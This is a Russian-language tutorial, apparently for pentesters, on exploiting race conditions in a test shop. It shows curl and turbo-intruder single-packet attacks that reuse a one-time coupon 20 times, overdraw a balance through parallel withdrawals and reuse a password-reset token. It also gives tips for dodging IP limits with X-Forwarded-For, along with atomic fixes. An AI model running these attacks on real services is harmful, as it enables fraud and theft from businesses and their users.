## Задача

Иногда правило не обходят — его **обгоняют**. Если два запроса обрабатываются одновременно, проверка «а не использован ли купон?» может пройти **для обоих** до того, как первый запишет результат. Это **состояние гонки** (race condition) — один из самых недооценённых классов веб-багов.

Разберём магазин с купоном «один раз на пользователя».

## Наш пример: купон на скидку

У нас есть одноразовый купон `SAVE10`. Применяем его к заказу:

```bash
$ curl -s -b c.txt -d 'order=555&coupon=SAVE10' https://shop.local/cart/coupon
{"status":"ok","discount":10,"order_total":90}
```

Повторно — отказ:

```bash
$ curl -s -b c.txt -d 'order=555&coupon=SAVE10' https://shop.local/cart/coupon
{"error":"coupon_already_used"}
```

Логика на сервере примерно такая: `if (!used) { mark_used(); apply_discount(); }`. Проблема — между проверкой и записью есть зазор. Если успеть в него двумя запросами, оба пройдут проверку.

## Шаг 1: наивная параллельность не помогает

Попробуем послать два запроса «одновременно» обычным способом:

```bash
$ for i in 1 2; do curl -s -b c.txt -d 'order=555&coupon=SAVE10' https://shop.local/cart/coupon & done; wait
{"error":"coupon_already_used"}
{"status":"ok","discount":10}
```

Один прошёл, второй — нет. Почему? Запросы **не совпали по времени**: сеть, TLS, обработка — разброс в десятки миллисекунд. Нужно, чтобы они пришли на сервер в один момент.

## Шаг 2: single-packet attack — все запросы в одном пакете

Приём **single-packet attack**: послать несколько HTTP/2-запросов **в одном TCP-пакете**, чтобы сервер получил их одновременно (разброс — микросекунды). Инструмент `turbo-intruder` делает это через Burp:

```
Request 1: POST /cart/coupon  coupon=SAVE10
Request 2: POST /cart/coupon  coupon=SAVE10
... (20 копий в одном пакете)
```

Отправляем 20 копий разом:

```bash
# turbo-intruder, gate: send on last byte, 20 параллельных соединений HTTP/2
$ cat race_result.json | jq '[.[] | .discount] | add'
{"total_discount":200}
```

Итоговая скидка 200 при купоне на 10 — сработало 20 раз. **Гонка выиграна**: проверка «уже использован» прошла для всех копий до записи.

> **Состояние гонки** — результат зависит от порядка/одновременности операций. Классический паттерн: проверка и действие разнесены (TOCTOU, time-of-check to time-of-use).

## Шаг 3: где ещё живут гонки

- **Лимиты:** один бесплатный товар «на пользователя» — забери его N раз.
- **Баланс/перевод:** отправь больше денег, чем есть, пока баланс не обновился.
- **Голосование/лайк:** накрути счётчик, обгоняя проверку «уже голосовал».
- **Регистрация:** займи один и тот же username/email дважды.
- **Сброс пароля:** используй один токен дважды одновременно.

Правило: ищи места, где есть **проверка, а затем изменение** состояния.

## Шаг 4: почему это трудно чинить

Обычные защиты (rate-limit, капча) не помогают — запросы легальны и одновременны. Правильное решение — **атомарность**: одна операция с блокировкой строки (`SELECT ... FOR UPDATE`), уникальный индекс, транзакция с проверкой условия внутри. Если сервер не делает этого — гонка возможна.

## Шаг 5: продвинутые многошаговые сценарии

Гонка — не единственный «временной» абьюз. Есть ещё:

- **Отложенная проверка:** оплата подтверждается асинхронно; пользуйся товаром до отмены.
- **Порядок шагов:** пропусти шаг мастера (внеси адрес до оплаты, активируй аккаунт без подтверждения).
- **Откат:** отмени операцию после того, как она дала выгоду (возврат после использования).
- **Повтор отзыва:** отзови подписку, но сохрани премиум-статус.

Все они проверяются одним вопросом: «что если сделать шаги в неверном порядке или одновременно?»

## Если не сработало

- **Запросы не совпадают** — используй HTTP/2 single-packet или `Race-The-Web` (последний байт).
- **Есть блокировка строки** — ищи другой эндпоинт без транзакции.
- **Ограничение по IP** — распредели запросы или меняй `X-Forwarded-For`.
- **Один сервер сериализует** — попробуй разные воркеры (несколько соединений, разные узлы).

## Что мы теперь знаем

- Гонка обгоняет проверку: проверка и действие разнесены (TOCTOU).
- Обычная параллельность не работает — нужен single-packet attack (один пакет, HTTP/2).
- Цели гонок: лимиты, баланс, голосования, регистрация, сброс пароля.
- Защита — атомарность (блокировки, уникальные индексы), а не rate-limit.

## Частые вопросы

**Разве сервер не обрабатывает запросы по очереди?** Не всегда: несколько воркеров/потоков обрабатывают параллельно, и «проверил — изменил» не атомарно. Отсюда гонка.

**Почему обычные параллельные curl не срабатывают?** Из-за разброса по времени (сеть, TLS, обработка). Нужно, чтобы запросы пришли **в один момент** — single-packet attack.

**Что такое single-packet attack?** Несколько HTTP/2-запросов в **одном TCP-пакете**: сервер получает их одновременно, разброс — микросекунды.

**Как не устроить хаос на проде?** Начинай с малого числа копий, не трогай деньги/баланс без согласования, фиксируй только доказательство (например, двойную скидку).

**Все ли гонки про деньги?** Нет: лимиты, голосования, регистрация, сброс пароля, «один раз» — везде, где есть проверка перед изменением.

**Как исправляют гонки?** Атомарностью: блокировка строки (`SELECT ... FOR UPDATE`), уникальный индекс, транзакция с условием внутри.

## Ещё один сценарий: гонка на выводе средств

Классика — вывод денег. Проверим баланс и попробуем два перевода одновременно:

```bash
$ curl -s -b c.txt https://shop.local/api/balance
{"balance":100}

# 20 параллельных запросов на вывод 100 (single-packet attack)
$ cat race_withdraw.txt | jq '[.[] | .status] | group_by(.) | map({(.[0]): length}) | add'
{"ok":5,"insufficient_funds":15}
```

Пять переводов прошли при балансе 100 — сервер списал деньги пять раз, не успев обновить баланс. Итог: счёт ушёл в минус. Это та же гонка «проверил — изменил», только на деньгах.

Ещё цель — **одноразовый токен**:

```bash
$ # два одновременных запроса с одним reset-токеном
$ cat race_token.txt | jq '[.[] | .status] | unique'
["ok"]   # оба приняты
```

## На что смотреть дальше

- **Проверка → изменение.** Любой код «сначала проверь, потом запиши».
- **Одноразовые действия.** Купоны, токены, «один раз на пользователя».
- **Деньги.** Переводы, выводы, баланс — самые дорогие цели.
- **Лимиты.** «N в день» — обгони счётчик.
- **Инструменты.** HTTP/2 single-packet (turbo-intruder), `Race-The-Web`.
- **OPSEC.** Не устраивай реальный хаос; фиксируй минимальное доказательство.
